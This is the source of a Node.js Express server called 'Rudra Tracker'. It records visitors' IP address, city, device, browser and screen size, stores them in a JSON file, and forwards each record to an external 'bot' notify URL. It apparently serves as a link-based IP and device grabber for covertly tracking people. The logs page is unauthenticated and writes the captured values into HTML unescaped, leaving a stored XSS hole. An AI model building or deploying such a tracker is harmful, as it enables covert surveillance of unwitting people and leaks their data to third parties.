const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

const logFile = path.join(__dirname, 'logs.json');

app.post('/log', async (req, res) => {
  const log = req.body;
  log.time = new Date().toLocaleString();
  let logs = [];

  if (fs.existsSync(logFile)) {
    logs = JSON.parse(fs.readFileSync(logFile));
  }
  logs.push(log);
  fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

  // Send to bot notify endpoint
  try {
    await fetch("https://your-bot-render-url.onrender.com/notify", {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(log)
    });
  } catch (e) {
    console.error("Notify failed:", e.message);
  }

  res.sendStatus(200);
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'tracker.html'));
});

app.get('/logs', (req, res) => {
  const logs = fs.existsSync(logFile) ? JSON.parse(fs.readFileSync(logFile)) : [];
  let html = `<h1 style="text-align:center">📒 Rudra Tracker Logs</h1><table border="1" cellspacing="0" cellpadding="5" style="width:100%;font-family:monospace"><tr><th>UID</th><th>IP</th><th>City</th><th>Device</th><th>Browser</th><th>Screen</th><th>Time</th></tr>`;
  logs.reverse().forEach(log => {
    html += `<tr><td>${log.uid}</td><td>${log.ip}</td><td>${log.city}</td><td>${log.os}</td><td>${log.browser}</td><td>${log.screen}</td><td>${log.time}</td></tr>`;
  });
  html += "</table>";
  res.send(html);
});

app.get('/ss', (req, res) => {
  const url = req.query.url;
  if (!url) return res.status(400).send("Missing URL");
  res.redirect(`https://image.thum.io/get/width/1200/crop/700/noanimate/${url}`);
});

app.listen(PORT, () => console.log(`Rudra Final Tracker running on port ${PORT}`));